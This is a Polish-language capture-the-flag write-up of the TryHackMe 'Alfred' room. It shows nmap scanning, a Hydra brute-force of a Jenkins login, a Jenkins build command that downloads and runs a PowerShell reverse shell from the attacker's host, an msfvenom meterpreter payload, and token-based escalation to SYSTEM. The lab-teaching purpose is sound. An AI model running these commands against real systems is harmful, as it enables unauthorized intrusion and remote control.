# THM Alfred

![](/alfred_poczatek.bmp)
To raczej plrosty pokój w konwencji prowadzenia za rękę osoby szkolonej. Do napisania tego `repozytorium` zmotywowało mnie pytanie drugie, o dane uwierzytelniające w `Task 1`. Będąc szczerym, w moim przypadku był to totalny strzał typu: admin:admin i udało się. Pomyślałem, że prezentuje mi to `złą konfigurację oprogramowania`- nie może być tak, że administrator systemu, urządzeń ipt pozostawia fabryczne dane uwierzytelniające, które powinny być wykorzystane do pierwszego logowania. Sprawdziłem kilka `Write-ups` i podejście do tego pytania jest różne. W tym podejściu do tego zadania wykorzystam aplikację `Burp Suide` i `Hydra`.

## Task 1 Initial Access

![](/alfred_wyja%C5%9Bnienie.bmp)

Rozwiązując ten pokój zaczynam od `nmap`.

```
sudo nmap -Pn -A -sV --script=default,vuln -p- --open -oA alfredNmap 10.10.61.255
[sudo] password for kali:  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-25 06:33 EDT
Nmap scan report for 10.10.61.255
Host is up (0.056s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
| vulners: 
|   cpe:/a:microsoft:internet_information_services:7.5: 
|       CVE-2010-3972   10.0    https://vulners.com/cve/CVE-2010-3972
|       SSV:20122       9.3     https://vulners.com/seebug/SSV:20122    *EXPLOIT*
|       CVE-2010-2730   9.3     https://vulners.com/cve/CVE-2010-2730
|       SSV:20121       4.3     https://vulners.com/seebug/SSV:20121    *EXPLOIT*
|_      CVE-2010-1899   4.3     https://vulners.com/cve/CVE-2010-1899
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-csrf: Couldn't find any CSRF vulnerabilities.
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2023-06-25T10:40:00+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2023-06-25T10:36:36+00:00
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2023-06-24T10:29:51
|_Not valid after:  2023-12-24T10:29:51
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-robots.txt: 1 disallowed entry 
|_/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-enum: 
|_  /robots.txt: Robots file
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Microsoft Windows 2008|7|8.1|Phone (90%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 (87%), Microsoft Windows Server 2008 R2 (87%), Microsoft Windows Server 2008 R2 or Windows 8 (87%), Microsoft Windows 7 SP1 (87%), Microsoft Windows 8.1 R1 (87%), Microsoft Windows Phone 7.5 or 8.0 (87%), Microsoft Windows 8.1 Update 1 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   57.12 ms 10.8.0.1
2   57.24 ms 10.10.61.255

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 415.73 seconds
```

Widzę, że mam 3 otwarte porty:
```
80/tcp   open  http               Microsoft IIS httpd 7.5
3389/tcp open  ssl/ms-wbt-server?
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
```
W przeglądarce sprawdzam co znajdę na `http://:80` i `http://:8080`. Na porcie `8080` znajduję formulasz do logowania.

Aby brutalnie wymusić formularz logowania przy użyciu Hydry, adres URL, parametr formularza i komunikat o błędzie logowania powinny być dokładne.

Uzyskanie adresu URL i parametru formularza można uzyskać za pomocą Burp.

![](/alfred_burp.bmp)

Przechwytuj ten ruch za pomocą BurpSuite Proxy

Parametry dla Hydry:

Adres URL : /j_acegi_security_check

USSER = user

PASSWORD = pass

Port = 8080

W przypadku nazwy użytkownika i hasła możesz użyć najpopularniejszego (user i pass).

Następnie poleceniem:
```
hydra -s 8080 10.10.61.255 http-post-form "/j_acegi_security_check:user=^USER^&pass=^PASS^:Invalid username or password" -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt
```
próbuję uzyskać dane uwierzytelniające.
![](/alfred_login_8080.bmp)

Po zdobyciu danych uwierzytelniających, loguję się w ustawieniach projektu. Znajduję tam możliwość zdalnego wykonania kodu.

![](/alfred_projekt.bmp)

Zgodnie z podpowiedzią w opisie zadania pobieram [odwrotną powłokę](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), przechodzę do edycji pliku i na końcu dodaję `nvoke-PowerShellTcp -Reverse -IPAddress 10.8.78.81 9999`. Następnie w danym katalogu poleceniem `python3 -m http.server 9000` otwieram serwer do wystawienia pliku z odwrotną powłoką, również w kolejnej zakładce w konsoli otwieram `nc -nvlp 9999`. W ustawieniach projektu za pomocą funkcji `Build` wprowadzam polecenie `powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.78.81:9000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.78.81 -Port 9999` klikam `Addp` i `Save`. Następnie uruchamiam kod.

![](/alfred_projekt_build.bmp)
![](/alfred_projekt_uruchomienie.bmp)

Po uruchomieniu odwrotnej powłoki poleceniem `whoami` sprawdzam na jakim użytkowniku jestem zalogowany. Następnie szukam flagi. Przechodzę na pulpit użytkownika poleceniem `cd C:\Users\bruce\Desktop` , następnie poleceniem `dir` sprawdzam czy flaga znajduje się w danym katalogu. Otwieram flage user.txt poleceniem `type user.txt`.

![](/alfred_powloka.bmp)
![](/alfred_powloka_flaga.bmp)

## Task 2  Switching Shells

Zgodnie z opisem zadania poleceniem `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.78.81 LPORT=1234 -f exe -o shell-name.exe` tworzę ładunek.

![](/alfred_odp_task_2.bmp)

 Następnie w uzyskanej poprzednio powłoce wpisuję polecenia:
 
 ```
PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.78.81:9000/shell1.exe','shell.exe')"
PS C:\Users\bruce\Desktop> dir


    Directory: C:\Users\bruce\Desktop
                                                                                                                    
                                                                                                                    
Mode                LastWriteTime     Length Name                                                                   
----                -------------     ------ ----                                                                   
-a---         6/25/2023   6:34 PM      73802 shell.exe                                                              
-a---        10/25/2019  11:22 PM         32 user.txt                                                               
                                                                                                                    
                                                                                                                    
PS C:\Users\bruce\Desktop> set lhost 10.8.78.81                                                                     
PS C:\Users\bruce\Desktop> Start-Process "shell.exe" 
 ``` 

 W innej zakładce terminala uruchamiam aplikację `Metasploit` poleceniem `msfconsol`. 
 Następnie wykonuję polecenia w `Metasploit`:
 ```
msf6 > use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specifi
                                     ed)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.8.78.81
lhost => 10.8.78.81
msf6 exploit(multi/handler) > set lport 5555
lport => 5555
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.78.81:5555 
[*] Sending stage (175686 bytes) to 10.10.61.255
[*] Meterpreter session 1 opened (10.8.78.81:5555 -> 10.10.61.255:49488) at 2023-06-25 11:06:31 -0400
 ```
 ## Task 3  Privilege Escalation

To zadanie polega na migracji do procesu z wyższymi uprawnieniami. Wykonując podpowiedzi z zadania w `Metasploit` wpisuję polecenia:
```
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\ShellHWDetection
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\WdiSystemHost
NT SERVICE\Winmgmt
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
No tokens available

meterpreter > ps
                                                                                                                    
Process List                                                                                                        
============                                                                                                        
                                                                                                                    
 PID   PPID  Name                  Arch  Session  User                          Path                                
 ---   ----  ----                  ----  -------  ----                          ----                                
 0     0     [System Process]                                                                                       
 4     0     System                x64   0                                                                          
 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe        
 404   1808  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe         
 524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe       
 572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe       
 580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe     
 608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe    
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe    
 676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe       
 684   580   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe         
 772   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe     
 848   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe     
 920   608   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe     
 936   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe     
 988   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe     
 1012  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe     
 1016  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe     
 1064  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1208  668   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1236  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1340  668   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1380  2708  shell.exe             x86   0        alfred\bruce                  C:\Users\bruce\Desktop\shell.exe
 1420  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1444  668   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1472  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1616  668   jenkins.exe           x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkins.exe
 1708  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1808  1616  java.exe              x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bin\java.exe
 1824  668   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1864  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 1892  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 1916  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2152  668   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 2248  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2296  772   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 2600  668   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2708  404   powershell.exe        x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 2992  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe

meterpreter > migrate 668
[*] Migrating from 1380 to 668...
[*] Migration completed successfully.
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 2548 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd C:\Windows\System32\config
cd C:\Windows\System32\config

C:\Windows\System32\config>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E033-3EDD

 Directory of C:\Windows\System32\config

06/25/2023  06:28 PM    <DIR>          .
06/25/2023  06:28 PM    <DIR>          ..
10/25/2019  10:46 PM            28,672 BCD-Template
06/25/2023  06:38 PM        18,087,936 COMPONENTS
06/25/2023  06:38 PM           262,144 DEFAULT
07/14/2009  03:34 AM    <DIR>          Journal
10/25/2019  09:58 PM    <DIR>          RegBack
10/26/2019  12:36 PM                70 root.txt
06/25/2023  06:27 PM           262,144 SAM
06/25/2023  06:37 PM           262,144 SECURITY
06/25/2023  06:37 PM        38,797,312 SOFTWARE
06/25/2023  06:41 PM        10,485,760 SYSTEM
11/21/2010  03:41 AM    <DIR>          systemprofile
10/25/2019  09:47 PM    <DIR>          TxR
               8 File(s)     68,186,182 bytes
               6 Dir(s)  20,525,461,504 bytes free

C:\Windows\System32\config>type root.txt
type root.txt
dff0f748678f280250f25a45b8046b4a
```

#### Jak wspominałem na początku do napisania tego `repozytorium` zmotywoała mnie "luka" opisywana w `OWASP Top 10`. Dla zainteresowanych TryHackMe posiada dwa pokoje poświęcone wyjaśnieniu czym jest `OWASP Top 10`:
##### [OWASP Top 10 - 2021](https://tryhackme.com/room/owasptop102021) Task 12, [OWASP Top 10](https://tryhackme.com/room/owasptop10) Task 19.
##### [Opis podatności wg. OWASP](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
